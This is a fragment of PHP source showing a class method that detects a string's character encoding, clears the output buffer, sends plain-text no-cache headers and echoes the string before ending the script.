	function output($str, $charset = DETECT_SYS_CHARSET) {
		$error = @ob_get_contents();

		switch (mb_detect_encoding($str, "UTF-8, GB2312, ISO-8859-1, ISO-8859-15", true)) {
		case 'UTF-8':
			$charset = 'utf-8';
			break;
		default:
			break;
		}

		@ob_end_clean();
		header("Content-Type: text/plain;charset=" . $charset);
		header("Cache-Control: no-cache");
		header("Pragma: no-cache");
		echo $str;
		die();
	}
}
?>